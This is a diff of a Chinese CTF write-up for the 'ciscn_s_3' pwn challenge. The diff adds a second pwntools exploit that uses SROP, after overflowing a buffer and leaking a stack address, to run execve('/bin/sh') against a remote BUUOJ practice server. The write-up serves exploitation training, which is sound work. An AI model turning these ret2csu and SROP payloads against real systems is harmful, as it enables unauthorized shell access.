@@ -4,9 +4,9 @@
 
 这是一道retcsu题，利用syscall和rop使execve('/bin/sh',0,0)条件成立
 
-有两种方法
+有两种方法，一种是`ret2csu`，另外一种是`ret2srop`
 
-# exp
+# exp_1
 
 ```python
 from pwn import *
@@ -32,6 +32,34 @@ payload2=flat(b'/bin/sh\x00',cyclic(0x8),p64(pop_rdx_6),0,0,p64(bin_sh+0x50),0,0
 #bin_sh+0x50是对于下面pop_rdi=0x4005a3地址的偏移，call的push下一地址会和执行的pop_rdi相互抵消了，所有实际上就是绕过了call函数，继续执行下面的函数
 payload2+=flat(p64(pop_rdi),p64(bin_sh),p64(pop_rsi_r15),0,0,p64(mov_rax_0x3b),p64(syscall))
 p.send(payload2)
+p.interactive()
+```
+
+# exp_2
+
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+p = remote('node5.buuoj.cn', 27324)
+# p=process("./ciscn_s_3")
+elf = ELF('./ciscn_s_3')
+
+sigreturn = 0x4004DA #sigreturn的调用号0xf(15)
+syscall = 0x400517
+vuln = 0x4004ED
+p.send(b'a' * 0x10 + p64(vuln))#溢出，然后
+
+binsh = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x118
+
+#使用pwntools集成好的对SROP的攻击方法
+frame = SigreturnFrame()
+frame.rax = 59
+frame.rdi = binsh
+frame.rip = syscall
+frame.rsi = 0
+
+payload = b"/bin/sh\x00" * 2 + p64(sigreturn) + p64(syscall) + bytes(frame)
+p.send(payload)
 p.interactive()
 ```
 
